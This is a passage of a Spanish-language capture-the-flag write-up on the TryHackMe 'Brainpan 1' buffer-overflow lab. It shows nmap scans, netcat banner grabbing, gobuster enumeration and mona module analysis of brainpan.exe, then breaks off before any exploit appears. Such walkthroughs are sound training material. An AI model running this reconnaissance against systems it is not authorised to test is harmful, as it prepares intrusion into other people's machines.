<!DOCTYPE html>
<html class="" lang="en"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            Brainpan 1 [TryHackMe]  &ndash;
        
        K3ssDev
:/var/log$  
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
<meta name="author" content="Alberto Pérez" />

    
        <meta name="keywords" content='Buffer Overflow, Exploit Development, GTFOBins, Hard, Immunity Debugger, Linux, Metasploit, Meterpreter, Mona, Privilege Escalation, Python, Reverse Shell, TryHackMe' />
    
    
        <meta name="description" content="ma máquina que he hecho en TryHackMe ha sido Brainpan 1. Se trata de una máquina de nivel &amp;ldquo;difícil&amp;rdquo; para la que necesitaremos explotar un buffer overflow de un binario de Windows que se está ejecutando en un una máquina Linux." />
    

<meta property="og:site_name"
    content='K3ssDev
:/var/log$  ' />

    <meta property="og:title" content="Brainpan 1 [TryHackMe]" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Alberto Pérez" />
    <meta
        property="article:published_time"
        content='2023-10-08T00:00:00Z&#43;0000' />
    
        
            <meta property="article:tag" content="Buffer Overflow" />
        
            <meta property="article:tag" content="Exploit Development" />
        
            <meta property="article:tag" content="GTFOBins" />
        
            <meta property="article:tag" content="Hard" />
        
            <meta property="article:tag" content="Immunity Debugger" />
        
            <meta property="article:tag" content="Linux" />
        
            <meta property="article:tag" content="Metasploit" />
        
            <meta property="article:tag" content="Meterpreter" />
        
            <meta property="article:tag" content="Mona" />
        
            <meta property="article:tag" content="Privilege Escalation" />
        
            <meta property="article:tag" content="Python" />
        
            <meta property="article:tag" content="Reverse Shell" />
        
            <meta property="article:tag" content="TryHackMe" />
        
    
    <meta property="og:url" content="https://k3ssdev.github.io/posts/brainpan1/" />
    <meta property="og:image"
        content='https://k3ssdev.github.io/images/post_pics/brainpan/brainpan.png
        ' />
    
        <meta property="og:description" content="Introducción La última máquina que he hecho en TryHackMe ha sido Brainpan 1. Se trata de una máquina de nivel &amp;ldquo;difícil&amp;rdquo; para la que necesitaremos ex" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='k3ssdev.github.io'
/>
<meta property="twitter:url" content="https://k3ssdev.github.io/posts/brainpan1/" />


    <meta name="twitter:title" content="Brainpan 1 [TryHackMe]" />
    
    <meta name="twitter:image"
        content='https://k3ssdev.github.io/images/post_pics/brainpan/brainpan.png
        ' />
    
        <meta name="twitter:description" content="Introducción La última máquina que he hecho en TryHackMe ha sido Brainpan 1. Se trata de una máquina de nivel &amp;ldquo;difícil&amp;rdquo; para la que necesitaremos ex" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">K3ssDev
:/var/log$  </a>
                        
                    </h1>
                    
                        <label id="hamburger-menu" for="main-nav-toggler">
                            &#xf85b;
                        </label>
                    
                </div>
                <div id="wide_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="mailto:k3ssdev@proton.me">
    
    
        &#xf6ed;
    
    <span>
        Email
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
    
    
        &#xf0e1;
    
    <span>
        Linkedin
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/k3ssdev">
    
    
        &#xf09b;
    
    <span>
        Github
    </span>
</a>

    </div>
    
        <div id="sidebar_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
        
    
<script src="https://tryhackme.com/badge/1277295"></script>


</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Brainpan 1 [TryHackMe]</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-10-08

</p>
    
    
    
        <figure style="margin: 0">
            <img src="/images/post_pics/brainpan/brainpan.png" alt="" />
            
        </figure>
    
    
    <div><h2 id="introducción">Introducción</h2>
<p>La última máquina que he hecho en TryHackMe ha sido Brainpan 1. Se trata de una máquina de nivel &ldquo;difícil&rdquo; para la que necesitaremos explotar un buffer overflow de un binario de Windows que se está ejecutando en un una máquina Linux. No hay flags ni ninguna indicación, simplemente tenemos que conseguir acceso a la máquina y obtener una shell con privilegios de administrador.</p>
<h2 id="escaneo-de-puertos">Escaneo de puertos</h2>
<p>Lo primero que haremos será escanear los puertos de la máquina con nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial 10.10.115.44
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sat Oct  7 23:47:02 2023 as: nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial 10.10.115.44</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.115.44
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>9999/tcp  open  abyss
</span></span><span style="display:flex;"><span>10000/tcp open  snet-sensor-mgmt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Oct  7 23:47:15 2023 -- 1 IP address (1 host up) scanned in 13.11 seconds</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sat Oct  7 23:47:02 2023 as: nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial 10.10.115.44</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.115.44
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>9999/tcp  open  abyss
</span></span><span style="display:flex;"><span>10000/tcp open  snet-sensor-mgmt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Oct  7 23:47:15 2023 -- 1 IP address (1 host up) scanned in 13.11 seconds</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sat Oct  7 23:47:15 2023 as: nmap -p9999,10000 -sC -sV -Pn -oN nmap_final 10.10.115.44</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.115.44
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.046s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>9999/tcp  open  abyss?
</span></span><span style="display:flex;"><span>| fingerprint-strings:
</span></span><span style="display:flex;"><span>|   NULL:
</span></span><span style="display:flex;"><span>|     _| _|
</span></span><span style="display:flex;"><span>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
</span></span><span style="display:flex;"><span>|     _|_| _| _| _| _| _| _| _| _| _| _| _|
</span></span><span style="display:flex;"><span>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
</span></span><span style="display:flex;"><span>|     <span style="color:#f92672">[</span>________________________ WELCOME TO BRAINPAN _________________________<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>|_    ENTER THE PASSWORD
</span></span><span style="display:flex;"><span>10000/tcp open  http    SimpleHTTPServer 0.6 <span style="color:#f92672">(</span>Python 2.7.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port9999-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/7%Time<span style="color:#f92672">=</span>6521D1EA%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
</span></span><span style="display:flex;"><span>SF:LL,298,<span style="color:#e6db74">&#34;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Oct  7 23:47:55 2023 -- 1 IP address (1 host up) scanned in 39.38 seconds</span>
</span></span></code></pre></div><p>Vemos que tenemos dos puertos abiertos, el 9999 y el 10000. El primero de ellos es el puerto de escucha del binario que vamos a explotar, y el segundo es un puerto de gestión de un sniffer de red que no nos interesa.</p>
<h2 id="enumeración">Enumeración</h2>
<p>Vamos a enumerar el puerto 9999 y el puerto 10000 con netcat para ver qué nos devuelve:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -vn 10.10.115.44 <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>Connection to 10.10.115.44 <span style="color:#ae81ff">9999</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
</span></span><span style="display:flex;"><span>_|                            _|                                        
</span></span><span style="display:flex;"><span>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
</span></span><span style="display:flex;"><span>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style="display:flex;"><span>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
</span></span><span style="display:flex;"><span>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
</span></span><span style="display:flex;"><span>                                            _|                          
</span></span><span style="display:flex;"><span>                                            _|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>________________________ WELCOME TO BRAINPAN _________________________<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>                          ENTER THE PASSWORD                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                          &gt;&gt; 
</span></span><span style="display:flex;"><span>                          ACCESS DENIED
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -vn 10.10.115.44 <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span>Connection to 10.10.115.44 <span style="color:#ae81ff">10000</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
</span></span><span style="display:flex;"><span>hola
</span></span><span style="display:flex;"><span>&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;Error response&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;
</span></span><span style="display:flex;"><span>&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;Error code 400.
</span></span><span style="display:flex;"><span>&lt;p&gt;Message: Bad request syntax <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hola&#39;</span><span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>&lt;p&gt;Error code explanation: 400 <span style="color:#f92672">=</span> Bad request syntax or unsupported method.
</span></span><span style="display:flex;"><span>&lt;/body&gt;
</span></span></code></pre></div><p>Vemos que el puerto 9999 nos devuelve un banner con un mensaje de bienvenida y un campo para introducir una contraseña. El puerto 10000 nos devuelve un error 400 al enviarle un mensaje.</p>
<p>Decido probar a enumerar el peurto 10000 con gobuster para ver si hay algún directorio web que podamos explorar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir --url <span style="color:#e6db74">&#34;http://10.10.115.44:10000/&#34;</span> -w <span style="color:#e6db74">&#34;/usr/share/wordlists/dirbuster/directory-list-1.0.txt&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.115.44:10000/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/bin                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /bin/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">11466</span> / <span style="color:#ae81ff">141709</span> <span style="color:#f92672">(</span>8.09%<span style="color:#f92672">)</span>^C
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Keyboard interrupt detected, terminating.
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">11509</span> / <span style="color:#ae81ff">141709</span> <span style="color:#f92672">(</span>8.12%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p>Al parecer hay un directorio llamado /bin. Al acceder a él vemos que se trata de un directorio de descarga de un binario llamado brainpan.exe que debe ser el binario que se está ejecutando en el puerto 9999. Lo descargo y me dispongo a analizarlo con Inmunity Debugger en una máquina Windows 7 que tengo en VirtualBox.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file brainpan.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>brainpan.exe: PE32 executable <span style="color:#f92672">(</span>console<span style="color:#f92672">)</span> Intel <span style="color:#ae81ff">80386</span> <span style="color:#f92672">(</span>stripped to external PDB<span style="color:#f92672">)</span>, <span style="color:#66d9ef">for</span> MS Windows, <span style="color:#ae81ff">5</span> sections
</span></span></code></pre></div><h2 id="análisis-del-binario">Análisis del binario</h2>
<p>Lo primero que hago es abrir el binario con Inmunity Debugger y analizarlo con mona para ver si hay algún módulo vulnerable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona modules
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------- Mona command started on 2023-10-08 23:15:09 <span style="color:#f92672">(</span>v2.0, rev 634<span style="color:#f92672">)</span> ----------
</span></span><span style="display:flex;"><span>0BADF00D   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Processing arguments and criteria
</span></span><span style="display:flex;"><span>0BADF00D       - Pointer access level : X
</span></span><span style="display:flex;"><span>0BADF00D   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating module info table, hang on...
</span></span><span style="display:flex;"><span>0BADF00D       - Processing modules
</span></span><span style="display:flex;"><span>0BADF00D       - Done. Let<span style="color:#e6db74">&#39;s rock &#39;</span>n roll.
</span></span><span style="display:flex;"><span>0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>0BADF00D    Module info :
</span></span><span style="display:flex;"><span>0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename &amp; Path, DLLCharacteristics
</span></span><span style="display:flex;"><span>0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>0BADF00D    0x75920000 | 0x75926000 | 0x00006000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>NSI.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\N</span>SI.dll<span style="color:#f92672">)</span> 0x540
</span></span><span style="display:flex;"><span>0BADF00D    0x76d30000 | 0x76d76000 | 0x00046000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>KERNELBASE.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\K</span>ERNELBASE.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x77480000 | 0x774b5000 | 0x00035000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>WS2_32.DLL<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\W</span>S2_32.DLL<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x770f0000 | 0x77200000 | 0x00110000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>kernel32.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\k</span>ernel32.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x75930000 | 0x759dc000 | 0x000ac000 | True   | True    | True  | False |  True    | True   | 7.0.7600.16385 <span style="color:#f92672">[</span>msvcrt.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\m</span>svcrt.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x75710000 | 0x7571c000 | 0x0000c000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>CRYPTBASE.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\C</span>RYPTBASE.dll<span style="color:#f92672">)</span> 0x540
</span></span><span style="display:flex;"><span>0BADF00D    0x75720000 | 0x75780000 | 0x00060000 | True   | True    | True  | False |  True    | True   | 6.1.7601.17514 <span style="color:#f92672">[</span>SspiCli.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>yswow64<span style="color:#ae81ff">\S</span>spiCli.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x77bc0000 | 0x77d40000 | 0x00180000 | True   | True    | True  | False |  True    | True   | 6.1.7600.16385 <span style="color:#f92672">[</span>ntdll.dll<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\n</span>tdll.dll<span style="color:#f92672">)</span> 0x140
</span></span><span style="display:flex;"><span>0BADF00D    0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False | False |  False   | False  | -1.0- <span style="color:#f92672">[</span>brainpan.exe<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\b</span>of<span style="color:#ae81ff">\b</span>rainpan<span style="color:#ae81ff">\b</span>rainpan.exe<span style="color:#f92672">)</span> 0x0
